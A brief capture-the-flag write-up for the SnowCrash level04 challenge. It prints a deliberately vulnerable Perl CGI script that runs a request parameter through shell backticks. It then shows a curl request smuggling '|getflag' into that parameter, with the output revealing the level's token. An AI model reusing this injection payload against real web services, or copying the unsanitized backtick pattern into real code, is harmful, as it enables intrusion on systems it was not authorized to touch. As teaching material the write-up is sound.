after inspecting the home directory we fond this perl script
```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
the script runs a web server on `localhost:4747` and executes the `x` parameter as a shell command using backticks. This introduces a **command injection vulnerability** due to unsanitized user input.

the executable file for the script has the **Set-User-ID (SUID)** bit set, allowing it to run with the permissions of its owner.

we can exploit this vulnerability using the following command `curl http://localhost:4747/?x="|getflag"`
```
level04@SnowCrash:~$ curl http://localhost:4747/?x="|getflag"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

on to the next level !
